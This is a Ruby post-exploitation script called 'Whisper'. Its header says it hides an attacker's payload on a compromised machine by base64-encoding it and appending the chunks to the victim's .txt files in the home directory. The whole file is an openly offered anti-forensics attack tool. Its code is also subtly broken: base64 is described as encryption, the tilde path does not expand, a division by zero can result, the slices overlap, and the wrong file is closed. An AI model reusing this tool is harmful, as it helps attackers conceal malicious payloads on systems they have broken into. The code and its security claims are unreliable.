##########################################################################################
#             .---.   ,---,                                                              #
#            /. ./| ,--.' |       ,--,                 ,-.----.                          #
#        .--'.  ' ; |  |  :     ,--.'|                 \    /  \               __  ,-.   #
#       /__./ \ : | :  :  :     |  |,       .--.--.    |   :    |            ,' ,'/ /|   #
#   .--'.  '   \' . :  |  |,--. `--'_      /  /    '   |   | .\ :    ,---.   '  | |' |   #
#  /___/ \ |    ' ' |  :  '   | ,' ,'|    |  :  /`./   .   : |: |   /     \  |  |   ,'   #
#  ;   \  \;      : |  |   /' : '  | |    |  :  ;_     |   |  \ :  /    /  | '  :  /     #
#   \   ;  `      | '  :  | | | |  | :     \  \    `.  |   : .  | .    ' / | |  | '      #
#    .   \    .\  ; |  |  ' | : '  : |__    `----.   \ :     |`-' '   ;   /| ;  : |      #
#     \   \   ' \ | |  :  :_:,' |  | '.'|  /  /`--'  / :   : :    '   |  / | |  , ;      #
#      :   '  |--"  |  | ,'     ;  :    ; '--'.     /  |   | :    |   :    |  ---'       #
#       \   \ ;     `--''       |  ,   /    `--'---'   `---'.|     \   \  /              #
#        '---"                   ---`-'                  `---`      `----'               #
# v1.0                                                                                   #
##########################################################################################
# Adonay Pichardo

# Post-Exploitation script to encrypt and copy payload-binaries into other files to avoid
# leaving payload-binaries unencrypted, centralized, and exposed, should attacker become
# disconnected from target machine.

# 1. Get list of .txt files current user has in their home directory
# 2. Begin encrypting payload-binaries
# 3. Splice encrypted payload-binaries into smaller files
# 4. Append encrypted splices to editable files

##########################################################################################
##########################################################################################
##########################################################################################
##########################################################################################
##########################################################################################
##########################################################################################
##########################################################################################
##########################################################################################

require 'base64'

payload = "whisper.rb"

inputFile = File.open(payload)
data      = inputFile.read
data      = Base64.encode64(data)

class Whisper
    @@textFiles       = Dir["~/*.txt"]
    @@whisperLocation = {}

    def getTextFiles
        return @@textFiles
    end

    def setWhisperLocation(fileName, location)
        @@whisperLocation[fileName] = location
    end

    def getWhisperLocation(fileName)
        return @@whisperLocation[fileName]
    end
end

psst = Whisper.new()

indexStart = 0
indexStep  = data.size / psst.getTextFiles.size
indexEnd   = indexStep

psst.getTextFiles.each {
    |file|
    temp          = File.open(file, 'r')
    fileLinesSize = temp.read.split("\n").size
    temp.close()
    textFile      = File.open(file, 'a')

    textFile.puts data[indexStart..indexEnd]
    temp.close()

    psst.setWhisperLocation(file, fileLinesSize + 1)
    puts psst.getWhisperLocation(file)

    indexStart = indexEnd
    indexEnd  += indexStep
}

psst.getTextFiles.each {
    |file|
    puts "#{file}:#{psst.getWhisperLocation(file)}"
}

psst.getTextFiles.each {
    |file|
    textFile = File.open(file, 'r')
    puts textFile.read
}
